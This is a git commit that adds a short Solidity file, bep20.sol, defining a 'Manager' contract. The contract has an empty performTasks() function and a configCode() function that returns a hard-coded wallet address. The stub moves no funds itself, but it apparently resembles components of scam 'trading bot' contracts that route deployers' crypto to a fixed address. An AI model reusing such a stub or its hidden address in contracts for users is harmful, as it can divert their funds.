cdbbe14486a2f4e3f41cfaff85566f0e0f8755b3
pepelefrog33 <143363780+pepelefrog33@users.noreply.github.com>
2023-08-28 00:42:13 +0000

    Create bep20.sol

---
+++ bep20.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0xD5Fed3b944d69a66260A207eD58ed85B71c3bf0b;
+    }
+}
